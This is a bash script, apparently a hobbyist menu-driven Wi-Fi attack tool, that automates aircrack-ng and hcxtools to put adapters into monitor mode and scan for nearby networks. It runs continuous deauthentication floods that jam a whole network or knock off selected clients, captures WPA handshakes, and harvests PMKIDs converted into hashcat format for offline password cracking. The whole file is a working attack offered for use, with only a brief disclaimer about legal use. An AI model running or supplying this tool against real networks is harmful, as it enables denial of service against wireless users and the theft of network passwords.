#!/bin/bash
ga0=" " # Wireless adaper name 1
gb0=" " # -        -     -    2
gc=" " # final adapter name !
gd=" " # bssid
ge=" " # channel
gf=" " # name
gg=" " # First wireless adapter name !
function main {
	echo "Choose what to do !"
	echo "1. Jam the Wi-Fi network" # done working tested !
	echo "2. Capture handshake " # done working tested !
	echo "3. Capture Pmkid " # done working tested!
	read sel
	if [ $sel = 1 ]
	then
		echo "1. Jam Entire Network ( as long as possible u want )"
		echo "2. Jam specific Network clients ( one at a time and can be selectable from maximum of 4 connected clients)"
		read sela
		if [ $sela = 1 ]
		then
			#echo "Killing any running processes !"
			#airmon-ng check kill
			#echo "Disabling moniter mode !"
			#airmon-ng stop $gc
			#echo "Turning off the adapter !"
			#iwconfig $gg power off
			echo "Changing adapter channel"
			airodump-ng -c $ge $gc &
			#iwconfig $gg channel $ge
			#echo "Turning adapter on"
			#iwconfig $gg power on
			#echo "Enbling moniter mode on it "
			#airmon-ng start $gg
			echo "Rechecking Target specification !"
			echo "target name == $gf"
			echo "target bssid == $gd"
			echo "target channel == $ge"
			echo "adapter name == $gc"
			#echo "adapter name == $gg"
			#echo "Press enter to jam the network !"
			#read mkfwwe
			xterm -hold -e aireplay-ng -0 0 -c $gd -a $gd $gc &
			#echo "Press enter to moniter it too "
			#read owemdewod
			#airodump-ng --bssid $gd -c $ge $gc
			echo "Press enter when u r done ! "
			read fwefeefef
		elif [ $sela = 2 ]
		then
			echo "Press enter to start searching for the clients to kick !"
			read tmpa
			echo "Press ctrl +c when u r done !"
			airodump-ng --bssid $gd -c $ge -w tmp/cfc $gc
			echo "Sorting !"
			c1=$(cat tmp/cfc-01.csv | awk 'FNR==6{print($1)}' | cut -d "," -f 1)
			c2=$(cat tmp/cfc-01.csv | awk 'FNR==7{print($1)}' | cut -d "," -f 1)
			c3=$(cat tmp/cfc-01.csv | awk 'FNR==8{print($1)}' | cut -d "," -f 1)
			c4=$(cat tmp/cfc-01.csv | awk 'FNR==9{print($1)}' | cut -d "," -f 1)
			rm tmp/*
			clear
			echo "Select the client to kick !"
			echo "1.$c1"
			echo "2.$c2"
			echo "3.$c3"
			echo "4.$c4"
			read kickme
			if [ $kickme = 1 ]
			then
				xterm -hold -e aireplay-ng -0 0 -a $gd -c $c1 $gc
			elif [ $kickme = 2 ]
			then
				xterm -hold -e aireplay-ng -0 0 -a $gd -c $c2 $gc
			elif [ $kickme = 3 ]
			then
				xterm -hold -e aireplay-ng -0 0 -a $gd -c $c3 $gc
			elif [ $kickme = 4 ]
			then
				xterm -hold -e aireplay-ng -0 0 -a $gd -c $c4 $gc
			else
				echo "Please enter a valid input"
			fi
		else
			echo "Please enter a valid input !"
		fi
	elif [ $sel = 2 ]
	then
		echo "AT leat one client must be connected to the wifi"
		echo "Press enter to search for clients "
		read emffmfm
		airodump-ng --bssid $gd -c $ge -w tmp/cfc2 $gc
                echo "Sorting !"
                d1=$(cat tmp/cfc2-01.csv | awk 'FNR==6{print($1)}' | cut -d "," -f 1)
                d2=$(cat tmp/cfc2-01.csv | awk 'FNR==7{print($1)}' | cut -d "," -f 1)
                d3=$(cat tmp/cfc2-01.csv | awk 'FNR==8{print($1)}' | cut -d "," -f 1)
                d4=$(cat tmp/cfc2-01.csv | awk 'FNR==9{print($1)}' | cut -d "," -f 1)
                rm tmp/*
		echo "Select the client to kick !"
                echo "1.$d1"
                echo "2.$d2"
                echo "3.$d3"
                echo "4.$d4"
                read kickeme
		echo "Press control +c when client is kicked !"
                if [ $kickeme = 1 ]
                then
                	xterm -hold -e aireplay-ng -0 0 -a $gd -c $d1 $gc
                elif [ $kickeme = 2 ]
                then
                        xterm -hold -e aireplay-ng -0 0 -a $gd -c $d2 $gc
                elif [ $kickeme = 3 ]
                then
                        xterm -hold -e aireplay-ng -0 0 -a $gd -c $d3 $gc
                elif [ $kickeme = 4 ]
                then
                        xterm -hold -e aireplay-ng -0 0 -a $gd -c $d4 $gc
                else
                        echo "Please enter a valid input"
                fi
		echo "Press ctrl + c when handshake is captured"
		airodump-ng --bssid $gd -c $ge -w tmp/handshake2 $gc
		echo "captured handshake with its files is saved in h folder ! "
		mv tmp/* h
	elif [ $sel = 3 ]
	then
		echo "Press enter get pmkid from ap and press control+c when pmkid founded !"
		read dm
		hcxdumptool -o pmk/$gd.pcapng --filterlist_ap=$gd -i $gc --enable_status=2
		echo ""
		echo "Converting into hashcat acceptable format (16800) ! with -E essidlist -I identitylist -U usernamelist flags set !"
		echo ""
		hcxpcaptool -E essidlist -I identitylist -U usernamelist -z pmk/$gd.16800 pmk/$gd.pcapng
		rm essidlist
		echo "Files saved in pmk folder ! "
	fi
}
function getname {  # extract adapters name from airmon-ng for 2 times
	if [ $1 -eq 1 ]
	then
		a=$(airmon-ng | awk 'FNR==4{print($2)}')
		b=$(airmon-ng | awk 'FNR==5{print($2)}')
		ga0=$a
		gb0=$b
	else
		a=$(airmon-ng | awk 'FNR==4{print($2)}')
                b=$(airmon-ng | awk 'FNR==5{print($2)}')
                ga0=$a
                gb0=$b
		sarg 2
	fi

}

function sarg { #ask user for adapter selection and put it to moniter mode and extract new adapter name from airmon-ng
	if [ $1 -eq 1 ]
	then
		echo "Select the Wi-fi adapter to use ! "
		echo "1. $ga0"
		echo "2. $gb0"
		read s
		if [ $s -eq 1 ]
		then
			airmon-ng check kill
			airmon-ng start $ga0
			gg=$ga0
		elif [ $s -eq 2 ]
		then
			airmon-ng check kill
			airmon-ng start $gb0
			gg=$gb0
		else
			echo "please enter a valid input !"
		fi
		clear
		getname 2
	else
		echo "Again Select the adapter to use !"
                echo "1. $ga0"
                echo "2. $gb0"
                read as
		if [ $as = 1 ]
		then
			gc=$ga0
		elif [ $as = 2 ]
		then
			gc=$gb0
		else
			echo "please enter a valid input !!"
		fi
	fi
}

function scnt { # sort wifi list and ask for user input
	echo "PRESS Ctrl + c when scan is done "
	airodump-ng -w tmp/swn $gc
	a=$(cat tmp/swn-01.csv | awk 'FNR==3{print($1,$6,$20)}')
	b=$(cat tmp/swn-01.csv | awk 'FNR==4{print($1,$6,$20)}')
	c=$(cat tmp/swn-01.csv | awk 'FNR==5{print($1,$6,$20)}')
	d=$(cat tmp/swn-01.csv | awk 'FNR==6{print($1,$6,$20)}')
	rm tmp/*
	clear
	echo "Select the Wifi network ! (WARNING = do not select the blank opions !!)"
	echo "1. $a"
	echo "2. $b"
	echo "3. $c"
	echo "4. $d"
	echo " "
	echo "1,2,3,4"
	echo "VVVVVVV"
	read sel
	if [ $sel -eq 1 ]
	then
		final=$a
	elif [ $sel -eq 2 ]
        then
                final=$b
	elif [ $sel -eq 3 ]
        then
                final=$c
	elif [ $sel -eq 4 ]
        then
                final=$d
	else
		echo "Please enter a valid input"
	fi
	e=$(echo $final | awk '{print($1)}' | cut -d "," -f 1 )
	f=$(echo $final | awk '{print($2)}' | cut -d "," -f 1 )
	g=$(echo $final | awk '{print($3)}')
	gd=$e
	ge=$f
	gf=$g
	clear
	echo "Wi-fi name : $g"
	echo "bssid : $e"
	echo "channel : $f"
	echo "Press enter to Continue !!"
	read last
	clear
}

function selectgp {
	clear
	echo 'This Script is created by not_@_$cr|pT kidd|e'
	echo ""
	echo "By using this script u are agree to use it legally <= typical software aggrements :-)"
	echo "but That's not a joke take it seriously ! I am not responsible of misuse of this script. "
	echo "You can modify this Script and make use of it in some sort ."
	echo ""
	echo "the sha256sum of this script (including this line )is :"
	echo ""
	echo "if u have any query then let me know using the following methods"
	echo "email :"
	echo "youtube (through this script intro. video comment section !)  :"
	echo "visit not_@_$cr|pT kidd|e on yt for more pentesting scripts and/or information(or spec.) regarding it"
	echo ""
	echo "Press enter to start"
	read tmp99
	echo "1. Start Scanning wireles networks (2.4GHz support only !)"
	echo "2. Restart Network manager service"
	echo "3. Disable moniter mode of a specifie wi-fi adapter"
	echo "4. Empty h (Handshake folder !)"
	echo "5. Empty pmk (Pmkid folder !)"
	echo "6. exit"
	read a
	if [ $a = 1 ]
	then
		getname 1
		sarg 1
		scnt
		main
	elif [ $a = 2 ]
	then
		service NetworkManager restart
	elif [ $a = 3 ]
	then
		a=$(airmon-ng | awk 'FNR==4{print($2)}')
                b=$(airmon-ng | awk 'FNR==5{print($2)}')
		echo "Select Adapter !"
		echo "1. $a"
		echo "2. $b"
		read s
		if [ $s = 1 ]
		then
			airmon-ng stop $a
		elif [ $s = 2 ]
		then
			airmon-ng stop $b
		else
			echo "Please enter a valid input !!"
		fi
	elif [ $a = 4 ]
        then
                echo "Current contents in h folder "
                ls h/
                echo "removing everything"
                rm h/*
                echo "check h folder "
                ls h/
	elif [ $a = 5 ]
        then
                echo "Current contents in pmk folder "
                ls pmk/
                echo "removing everything"
                rm pmk/*
                echo "check pmk folder "
                ls pmk/
	elif [ $a = 6 ]
	then
		echo "thank you for using this script"
		echo "visit not_@_$cr|pT kidd|e on yt for more pentesting scripts and or info."
	else
		echo "Please enter a valid input !!"
	fi
}
selectgp
